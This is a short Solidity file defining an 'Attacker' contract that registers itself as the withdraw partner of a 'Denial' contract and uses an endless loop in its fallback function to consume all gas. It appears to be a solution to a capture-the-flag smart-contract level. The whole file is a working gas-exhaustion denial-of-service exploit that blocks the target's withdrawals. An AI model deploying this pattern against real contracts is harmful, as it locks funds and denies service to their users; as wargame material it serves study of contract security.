// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Attacker {

  constructor(address payable _denial) {
    Denial denial = Denial(_denial);
    denial.setWithdrawPartner(address(this));
  }

  fallback() external payable {
    while(true){ // Spend all the gas until it is spent and it will return false.
    }
  }
}
